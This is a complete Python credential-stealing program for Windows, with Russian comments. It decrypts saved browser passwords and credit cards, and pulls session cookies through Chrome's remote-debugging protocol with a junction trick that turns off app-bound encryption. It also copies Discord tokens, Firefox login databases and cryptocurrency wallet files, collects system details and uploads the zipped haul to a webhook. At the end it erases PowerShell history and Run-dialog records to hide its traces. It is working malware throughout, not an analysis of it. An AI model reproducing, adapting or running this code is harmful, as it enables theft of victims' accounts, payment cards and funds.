# Python 3.10+, Win10/11, зависимости: requests pycryptodome websocket-client
import os, sys, json, base64, shutil, sqlite3, glob, re, zipfile
import tempfile, subprocess, time, ctypes, platform, socket
import urllib.request
from ctypes import wintypes
from pathlib import Path
from Crypto.Cipher import AES
import websocket

WEBHOOK = sys.argv[1] if len(sys.argv) > 1 else ""
TAG     = (os.environ.get("COMPUTERNAME", "host") + "_" + str(int(time.time()))).replace(" ", "_")
WORK    = Path(tempfile.mkdtemp(prefix="x_"))
OUT     = WORK / "dump"

def safe(fn, *a, **k):
    try: return fn(*a, **k)
    except Exception: return None

# ============================================================
# DPAPI через ctypes (crypt32.dll)
# ============================================================
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

crypt32  = ctypes.windll.crypt32
kernel32 = ctypes.windll.kernel32

def dpapi_dec(data: bytes):
    if not data: return None
    try:
        buf = ctypes.create_string_buffer(data, len(data))
        bin_ = DATA_BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
        bout = DATA_BLOB()
        if not crypt32.CryptUnprotectData(ctypes.byref(bin_), None, None, None, None, 0, ctypes.byref(bout)):
            return None
        out = ctypes.string_at(bout.pbData, bout.cbData)
        kernel32.LocalFree(bout.pbData)
        return out
    except Exception:
        return None

# ============================================================
# AES-GCM через pycryptodome (v10/v11)
# ============================================================
def aes_gcm_decrypt(key: bytes, nonce: bytes, ct: bytes, tag: bytes):
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ct, tag)
    except Exception:
        return None

def chrome_key(local_state: Path):
    try:
        ls  = json.loads(local_state.read_text(encoding="utf-8"))
        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return dpapi_dec(enc)
    except Exception:
        return None

def chrome_decrypt(blob: bytes, key):
    if not blob: return None
    try:
        if blob[:3] in (b"v10", b"v11") and key:
            nonce, ct, tag = blob[3:15], blob[15:-16], blob[-16:]
            out = aes_gcm_decrypt(key, nonce, ct, tag)
            return out.decode("utf-8", "ignore") if out else None
        out = dpapi_dec(blob)
        return out.decode("utf-8", "ignore") if out else None
    except Exception:
        return None

# ============================================================
# copy_shared
# ============================================================
_GEN_READ   = 0x80000000
_OPEN_EXIST = 3
_SHARE_READ = 0x01
_SHARE_RW   = 0x03
_k32 = ctypes.windll.kernel32
_CreateFileW = _k32.CreateFileW
_CreateFileW.restype  = wintypes.HANDLE
_CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                         wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
_ReadFile = _k32.ReadFile
_ReadFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD,
                      ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID]
_CloseHandle = _k32.CloseHandle

def copy_shared(src: Path, dst: Path) -> bool:
    for share in (_SHARE_READ, _SHARE_RW):
        h = _CreateFileW(str(src), _GEN_READ, share, None, _OPEN_EXIST, 0, None)
        if h == wintypes.HANDLE(-1).value: continue
        try:
            buf = ctypes.create_string_buffer(65536)
            written = wintypes.DWORD(0)
            with dst.open("wb") as out:
                while True:
                    ok = _ReadFile(h, buf, len(buf), ctypes.byref(written), None)
                    if not ok or written.value == 0: break
                    out.write(buf.raw[:written.value])
        finally:
            _CloseHandle(h)
        if dst.exists() and dst.stat().st_size > 0: return True
    return False

# ============================================================
# CDP через Junction (обход v20)
# ============================================================
def steal_cookies_cdp(browser_name, port, user_data_dir):
    print(f"\n[CDP {browser_name}] === START ===")
    if browser_name == "Chrome":
        paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                 r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
    elif browser_name == "Edge":
        paths = [r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                 r"C:\Program Files\Microsoft\Edge\Application\msedge.exe"]
    else:
        return False

    exe_path = next((p for p in paths if os.path.exists(p)), None)
    if not exe_path: return False
    exe_name = os.path.basename(exe_path)

    for name in (exe_name, "GoogleCrashHandler.exe", "GoogleCrashHandler64.exe", "chrome_proxy.exe"):
        subprocess.run(["taskkill", "/IM", name, "/F"], capture_output=True, timeout=10)
    time.sleep(4)

    user_data_dir = Path(user_data_dir)
    for lk in ("SingletonLock", "SingletonSocket", "SingletonCookie"):
        p = user_data_dir / lk
        if p.exists():
            safe(os.remove, p)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex(("127.0.0.1", port)) == 0: port += 100
        s.close()
    except Exception: pass

    junc_path = WORK / f"junc_{browser_name}"
    if junc_path.exists(): safe(os.rmdir, junc_path)
    
    subprocess.run(["cmd", "/c", "mklink", "/J", str(junc_path), str(user_data_dir)], capture_output=True)

    args = [
        exe_path,
        f"--remote-debugging-port={port}",
        "--remote-allow-origins=*",
        f"--user-data-dir={junc_path}",
        "--no-first-run",
        "--no-default-browser-check",
        "--disable-gpu",
        "--disable-features=LockProfileCookieDatabase,AppBoundEncryption"
    ]
    
    proc = safe(subprocess.Popen, args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if not proc: return False

    ws_url = None
    for i in range(30):
        time.sleep(1)
        try:
            resp = urllib.request.urlopen(f"http://127.0.0.1:{port}/json/version", timeout=2)
            ws_url = json.loads(resp.read())["webSocketDebuggerUrl"]
            break
        except Exception: pass

    if not ws_url:
        print(f"[CDP {browser_name}] CDP not up")
        subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True)
        safe(os.rmdir, junc_path)
        return False

    cookies = []
    try:
        ws = websocket.create_connection(ws_url, timeout=10)
        def send_and_wait(payload):
            ws.send(json.dumps(payload))
            while True:
                res = json.loads(ws.recv())
                if res.get("id") == payload["id"]: return res

        # Открываем вкладки для прогрева куки
        for domain in ("https://discord.com", "https://google.com"):
            res = send_and_wait({"id": 2, "method": "Target.createTarget", "params": {"url": domain}})
            target_id = res.get("result", {}).get("targetId")
            if target_id:
                res = send_and_wait({"id": 3, "method": "Target.attachToTarget", "params": {"targetId": target_id, "flatten": True}})
                sess = res.get("result", {}).get("sessionId")
                if sess: send_and_wait({"id": 4, "method": "Network.enable", "sessionId": sess})

        time.sleep(4) # ждём загрузки

        # Забираем ВСЁ
        res = send_and_wait({"id": 5, "method": "Storage.getCookies"})
        cookies = res.get("result", {}).get("cookies", [])
        print(f"[CDP {browser_name}] got {len(cookies)} cookies")
        ws.close()
    except Exception as e:
        print(f"[CDP {browser_name}] ws err: {e}")

    subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True, timeout=10)
    time.sleep(2)
    safe(os.rmdir, junc_path)

    if cookies:
        with (OUT / f"{browser_name}_CDP_cookies.txt").open("w", encoding="utf-8") as f:
            for c in cookies:
                f.write(f"{c.get('domain','')}\t{c.get('name','')}\t{c.get('value','')}\t{c.get('path','/')}\n")
        return True
    return False

# ============================================================
# Close/Reopen browsers
# ============================================================
_BROWSER_EXES = ("chrome.exe", "msedge.exe", "brave.exe", "browser.exe", "opera.exe")
_BROWSER_PATHS = [
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
]
def close_browsers():
    for exe in _BROWSER_EXES: safe(subprocess.run, ["taskkill", "/IM", exe], capture_output=True, timeout=10)
    time.sleep(4)
    for exe in _BROWSER_EXES: safe(subprocess.run, ["taskkill", "/IM", exe, "/F"], capture_output=True, timeout=5)
    time.sleep(2)
def reopen_browsers():
    for p in _BROWSER_PATHS:
        if os.path.exists(p):
            safe(subprocess.Popen, [p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

# ============================================================
# Chromium (пароли, карты)
# ============================================================
CHROMIUM = {
    "Chrome":  Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data",
    "Edge":    Path(os.environ["LOCALAPPDATA"]) / "Microsoft/Edge/User Data",
    "Brave":   Path(os.environ["LOCALAPPDATA"]) / "BraveSoftware/Brave-Browser/User Data",
}
def _chromium_item(prof: Path, rel: str, suffix: str, tag: str, key):
    src = prof / rel
    if not src.exists(): return
    tmp = WORK / f"_{suffix}_{tag}_{src.name}"
    if not copy_shared(src, tmp): return
    try:
        con = sqlite3.connect(f"file:{tmp}?mode=ro&immutable=1", uri=True)
        if suffix == "logins":
            rows = list(con.execute("SELECT origin_url, username_value, password_value FROM logins"))
            if rows:
                with (OUT / f"{tag}_logins.txt").open("w", encoding="utf-8") as f:
                    for url, user, pw in rows:
                        dec = chrome_decrypt(pw, key)
                        if dec: f.write(f"{url}\t{user}\t{dec}\n")
        elif suffix == "cards":
            rows = list(con.execute("SELECT card_number_encrypted, expiration_month||'/'||expiration_year, name_on_card FROM credit_cards"))
            if rows:
                with (OUT / f"{tag}_cards.txt").open("w", encoding="utf-8") as f:
                    for num, exp, nm in rows:
                        dec = chrome_decrypt(num, key) or ""
                        f.write(f"{nm}\t{dec}\t{exp}\n")
        con.close()
    except Exception: pass
    finally: safe(tmp.unlink)

def steal_chromium(name: str, ud: Path):
    if not ud.exists(): return
    key = chrome_key(ud / "Local State")
    for prof in [ud / "Default"] + sorted(ud.glob("Profile *")):
        if not prof.is_dir(): continue
        tag = f"{name}_{prof.name}"
        _chromium_item(prof, "Login Data", "logins", tag, key)
        _chromium_item(prof, "Web Data", "cards", tag, key)

# ============================================================
# Discord tokens, Firefox, Wallets, Sysinfo
# ============================================================
def steal_discord():
    pats = [re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}"), re.compile(r"mfa\.[\w-]{80,90}")]
    seen, lines = set(), []
    for base in ("discord", "discordcanary", "discordptb", "Lightcord"):
        r = Path(os.environ["APPDATA"]) / base / "Local Storage" / "leveldb"
        if not r.exists(): continue
        for f in sorted(r.glob("*")):
            if not f.is_file(): continue
            tmp = WORK / f"_ldb_{base}_{f.name}"
            if not copy_shared(f, tmp): continue
            try: raw = tmp.read_bytes()
            except Exception: raw = b""
            finally: safe(tmp.unlink)
            if not raw: continue
            for enc in ("utf-8", "utf-16-le", "latin-1"):
                try: text = raw.decode(enc, "ignore")
                except Exception: continue
                for p in pats:
                    for m in p.findall(text):
                        if m not in seen:
                            seen.add(m); lines.append(m)
    if lines: (OUT / "discord_tokens.txt").write_text("\n".join(lines), encoding="utf-8")

def steal_firefox():
    root = Path(os.environ["APPDATA"]) / "Mozilla/Firefox/Profiles"
    if not root.exists(): return
    for prof in root.glob("*"):
        for fn in ("key4.db", "logins.json", "cookies.sqlite", "places.sqlite"):
            src = prof / fn
            if src.exists(): safe(shutil.copy2, src, OUT / f"ff_{prof.name}_{fn}")

def steal_wallets():
    WALLETS = {
        "Exodus": Path(os.environ["APPDATA"]) / "Exodus/exodus.wallet",
        "Electrum": Path(os.environ["APPDATA"]) / "Electrum/wallets",
        "Ethereum": Path(os.environ["APPDATA"]) / "Ethereum/keystore",
    }
    for name, src in WALLETS.items():
        if not src.exists(): continue
        if src.is_dir(): safe(shutil.copytree, src, OUT / f"wallet_{name}")
        else: safe(shutil.copy2, src, OUT / f"wallet_{name}")

def steal_sysinfo():
    SYSINFO = {"hostname": "hostname", "whoami": "whoami /all", "ipconfig": "ipconfig /all", "systeminfo": "systeminfo", "ports": "netstat -an", "processes": "tasklist /v"}
    out = {}
    for k, cmd in SYSINFO.items():
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, encoding="cp866", errors="replace", timeout=10)
            out[k] = r.stdout.strip()
        except Exception: out[k] = "err"
    (OUT / "sysinfo.json").write_text(json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")

def steal_hostinfo():
    info = {"hostname": socket.gethostname(), "user": os.environ.get("USERNAME", ""), "platform": platform.platform()}
    (OUT / "hostinfo.json").write_text(json.dumps(info, indent=2, ensure_ascii=False), encoding="utf-8")

# ============================================================
# Pack & Main
# ============================================================
def pack_and_send():
    if not WEBHOOK: return
    zip_path = WORK / f"dump_{TAG}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(OUT):
            for fn in files:
                p = Path(root) / fn
                z.write(p, p.relative_to(OUT))
    try:
        import requests
        with zip_path.open("rb") as fh:
            requests.post(WEBHOOK, data={"content": f"```{TAG}```"}, files={"file": (zip_path.name, fh, "application/zip")}, timeout=60)
    except Exception: pass

def self_clean():
    for h in [Path(os.environ["APPDATA"]) / "Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"]:
        safe(h.unlink)
    safe(subprocess.run, ["cmd", "/c", r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f"], capture_output=True, timeout=10)

def main():
    OUT.mkdir(parents=True, exist_ok=True)
    safe(close_browsers)
    safe(steal_cookies_cdp, "Chrome", 9222, str(CHROMIUM["Chrome"]))
    safe(steal_cookies_cdp, "Edge", 9223, str(CHROMIUM["Edge"]))
    for n, ud in CHROMIUM.items(): safe(steal_chromium, n, ud)
    safe(steal_firefox)
    safe(steal_discord)
    safe(steal_wallets)
    safe(steal_sysinfo)
    safe(steal_hostinfo)
    safe(pack_and_send)
    safe(reopen_browsers)
    self_clean()
    safe(shutil.rmtree, WORK, True)

if __name__ == "__main__":
    main()